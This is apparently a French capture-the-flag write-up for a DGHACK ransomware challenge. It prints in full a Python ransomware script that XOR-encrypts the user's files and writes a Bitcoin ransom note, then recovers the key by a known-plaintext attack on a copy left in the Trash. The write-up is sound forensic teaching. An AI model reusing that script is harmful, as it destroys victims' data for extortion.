# Pas un bon nom

> J'étais là tranquillou sur mon PC, m'voyez ? Je télécharge des films et tout, m'voyez ? Et alors il y a ce message étrange que je dois payer Dogecoin pour déchiffrer mes données. Je ne l'ai pas fait... donc maintenant mes données sont chiffrées :( Donc tiens, prends le disque dur, c'est pas comme si il était utile maintenant... Sauf si c'était possible de retrouver la clé utilisée par ce méchant hacker, m'voyez ? S'il te plaiiiit ? Tu serais adorable merci !

## Description

On nous fournit une machine virtuelle Linux qui a été victime d'un ransomware.

Dans le dossier home de l'utilisateur je trouve un fichier `gta_installer.py`: 

```python
#!/bin/python3

import os
import fileinput
import sys

main_folder = "./"

def encryptDecrypt(inpDataBytes):

    # Define XOR key
    keyLength = len(xorKey)
 
    # calculate length of input string
    length = len(inpDataBytes)
 
    # perform XOR operation of key
    # with every byte
    for i in range(length):
        inpDataBytes[i] = inpDataBytes[i] ^ ord(xorKey[i % keyLength])

    return inpDataBytes

if __name__ == '__main__':
    # list all the files in the main folder, and its subfolders
    #list_of_files = [main_folder + f for f in os.listdir(main_folder) if os.path.isfile(main_folder + f) and not f.startswith('.')]
    list_of_files = []
    for root, dirs, files in os.walk(main_folder):
        for file in files:
            if not '/.' in os.path.join(root, file):
                # get the file name
                list_of_files.append(os.path.join(root, file))
    print(list_of_files)
    print("\n")

    xorKey = input("Enter the key you received after following the instructions in READ_TO_RETRIEVE_YOUR_DATA.txt: ")

    for file in list_of_files:
        if "GTA_V_installer.py" not in file:
            with open(file, 'rb') as f:
                data = bytearray(f.read())
                print("data : " + str(data) + "\n")
                encrypted_data = encryptDecrypt(data)
                print("encrypted : " + str(encrypted_data) + "\n")
            with open(file, 'wb') as f:
                f.write(encrypted_data)

    # Create a READ_TO_RETRIEVE_YOUR_DATA.txt file
    with open(main_folder + "READ_TO_RETRIEVE_YOUR_DATA.txt", 'w') as f:
        f.write("Your PC is now encrypted.\nThe only way you may retrieve your data is by sending 1000 Bitcoins to the following address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n")
        f.write("Add a message to the Bitcoin transfer with your email address.\nThe code to decrypt your data will be sent automatically to this email.\n")
        f.write("Once you get this code, simply run \"python GTA_V_installer.py\" and input your code.\n")
        f.write("I'm very sorry for the inconvenience. I need to feed my family.\n")
        f.write("HODL.\n")

    # I replace the line where the key is defined, that way I can use the same script for decryption without leaving any trace of the key
    is_edited = False
    for line in fileinput.input("./GTA_V_installer.py", inplace=1):
        if "xorKey = " in line and not is_edited:
            line = "    xorKey = input(\"Enter the key you received after following the instructions in READ_TO_RETRIEVE_YOUR_DATA.txt: \")\n"
            is_edited = True
        sys.stdout.write(line)
```

Les fichiers sont donc encryptés par une même clé avec XOR.

Or, je trouve en fouillant un peu deux fichiers qui sont probablement identiques :
- `Downloads/Adobe_Photoshop.torrent` qui est encrypté
- `.local/share/Trash/files/Adobe_Photoshop.torrent.txt` qui est dans la corbeille et qui est en clair.

Il s'agit probablement du même fichier, l'un en clair et l'autre non.

Comme `clair XOR clé = encrypté`, je peux retrouver la clé `clé = clair XOR encrypté`.

```python
def xor(a,b):
    c = []
    for i in range(len(a)):
        c.append(a[i] ^ b[i % len(b)])
    return bytes(c)

with open(".local/share/Trash/files/Adobe_Photoshop.torrent.txt", "rb") as f:
    decrypted = f.read()
with open("Downloads/Adobe_Photoshop.torrent", "rb") as f:
    encrypted = f.read()

key = xor(encrypted, decrypted)
print(key)
```

Ce qui me donne une chaîne en base 64 `REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=`.

Flag : `DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}`.